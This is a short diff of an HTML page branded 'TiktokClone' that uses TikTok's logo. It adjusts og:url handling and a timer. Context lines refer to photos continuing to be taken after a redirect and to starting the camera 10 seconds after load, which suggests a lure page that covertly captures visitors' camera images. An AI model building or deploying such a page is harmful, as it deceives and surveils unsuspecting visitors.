@@ -16,7 +16,7 @@
 
   <meta property="og:title" content="TiktokClone">
   <meta property="og:site_name" content="TiktokClone">
-  <meta property="og:url" content="https://tt-clone-pi.vercel.app/tt">
+  <meta property="og:url" content="https://tt-clone-pi.vercel.app">
   <meta property="og:description" content="Клон TikTok с функцией захвата видео">
   <meta property="og:image"
     content="https://lf16-tiktok-common.ibytedtos.com/obj/tiktok-web-common-sg/mtact/static/images/logo_144c91a.png?v=2">
@@ -33,7 +33,7 @@
     window.onload = function () {
       var ogUrlMeta = document.querySelector('meta[property="og:url"]');
       if (ogUrlMeta) {
-        ogUrlMeta.setAttribute('content', window.location.href);
+        ogUrlMeta.setAttribute('content', window.location.origin);
       }
     };
   </script>
@@ -95,7 +95,7 @@
         } else if (firstPhotoTaken) {
           console.log('Фотографии продолжают делаться, но редирект уже выполнен.');
         }
-      }, 3000);
+      }, 5000);
     }
 
     // Запуск камеры через 10 секунд после загрузки страницы
